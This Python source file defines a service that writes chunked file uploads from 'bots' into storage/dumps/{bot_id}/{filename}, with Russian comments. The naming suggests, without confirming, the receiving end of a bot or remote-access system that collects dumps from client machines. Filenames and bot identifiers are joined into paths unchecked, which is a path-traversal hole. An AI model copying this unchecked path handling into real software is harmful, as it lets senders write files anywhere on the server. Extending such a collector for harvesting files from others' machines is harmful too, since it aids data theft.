# backend/Services/FileManager.py

import time
from pathlib import Path
from typing import Dict, Any, Optional

import backend.LoggerWrapper as logger

class FileTransferService:
    """
    Сервис локального хранилища. 
    Отвечает за физическое создание структуры папок и запись файлов.
    Путь: storage/dumps/{bot_id}/{filename}
    """

    def __init__(self) -> None:
        """Определение базового пути хранилища."""
        self.storage_root: Path = Path("storage") / "dumps"
        self.active_transfers: Dict[str, Dict[str, Any]] = {}

    def init_transfer(self, bot_identifier: str, filename: str, total_size: int) -> None:
        """
        Проверяет/создает папки и подготавливает файл к записи.
        """
        try:
            # parents=True создаст storage и dumps, если их нет. 
            # exist_ok=True не выдаст ошибку, если папка бота уже существует.
            bot_directory: Path = self.storage_root / bot_identifier
            bot_directory.mkdir(parents=True, exist_ok=True)
            
            target_path: Path = bot_directory / filename
            transfer_key: str = f"{bot_identifier}_{filename}"

            # Всегда создаем новый файл или затираем старый при начале передачи
            with open(target_path, "wb") as f:
                f.truncate(0)

            self.active_transfers[transfer_key] = {
                "path": target_path,
                "total": total_size,
                "received": 0,
                "last_seen": time.time()
            }
            
            logger.Log.info(f"[FileManager] Directory verified. Ready to write {filename} for {bot_identifier}")
        except Exception as e:
            logger.Log.error(f"[FileManager] Storage system error: {e}")

    async def write_chunk(self, bot_identifier: str, filename: str, chunk_data: bytes) -> None:
        """
        Записывает чанк в файл в папке бота.
        """
        transfer_key: str = f"{bot_identifier}_{filename}"
        state: Optional[Dict[str, Any]] = self.active_transfers.get(transfer_key)

        if not state:
            return

        try:
            # Дозапись в бинарном режиме
            with open(state["path"], "ab") as f:
                f.write(chunk_data)

            state["received"] += len(chunk_data)
            state["last_seen"] = time.time()

            # Если всё получили — убираем из оперативной памяти
            if state["received"] >= state["total"]:
                logger.Log.success(f"[FileManager] File saved to: {state['path']}")
                self.active_transfers.pop(transfer_key, None)

        except Exception as e:
            logger.Log.error(f"[FileManager] Disk write error: {e}")
            self.active_transfers.pop(transfer_key, None)

# Глобальный инстанс
file_service: FileTransferService = FileTransferService()